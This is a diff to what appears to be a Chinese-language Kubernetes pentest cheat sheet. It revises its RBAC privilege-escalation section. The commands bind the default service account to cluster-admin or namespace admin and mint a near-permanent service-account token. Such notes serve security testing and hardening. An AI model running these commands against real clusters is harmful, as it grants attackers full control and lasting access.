@@ -116,8 +116,11 @@ etcdctl --endpoints=http://ETCD_IP:2379 \
 
 ### 4.2 RBAC 提权路径
 ```bash
-# 如果有 create rolebindings 权限
+# 如果有 create clusterrolebindings 权限
 kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default
+
+# 如果只有 namespace 级 create rolebindings 权限，只能在对应 namespace 内绑定 Role/ClusterRole
+kubectl create rolebinding pwn --clusterrole=admin --serviceaccount=default:default -n TARGET_NAMESPACE
 
 # 如果有 create serviceaccounts/token
 kubectl create token default --duration=999999h
